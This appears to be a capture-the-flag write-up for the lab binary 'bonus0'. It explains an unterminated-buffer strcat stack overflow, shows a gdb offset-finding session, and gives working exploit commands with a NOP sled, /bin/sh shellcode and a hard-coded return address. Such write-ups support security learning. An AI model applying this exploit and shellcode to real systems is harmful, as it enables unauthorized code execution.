The program receives 2 read() of maximum length of 0x1000 bytes. It will later use strcat to append both strings. We can exploit this, the 2 buffers are stored next each other. By avoid putting a \0 at the end of the first buffer, the strcat will consider the second string as part of the first one.

We inject 4095 random caracters followed by a \n (because there is an unchecked strchr using it later). Then we will inject an overflow pattern to find where the RET address is replaced.

(gdb) run
Starting program: /home/user/bonus0/bonus0
 - 
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
(gdb) info registers
eax            0x0      0
ecx            0xffffffff       -1
edx            0xb7fd28b8       -1208145736
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff740       0xbffff740
ebp            0x32614131       0x32614131
esi            0x0      0
edi            0x0      0
eip            0x41336141       0x41336141
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)


arg1 = python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' - nops + shellcode
arg2 = python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7' - pointer to shellcode

 (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0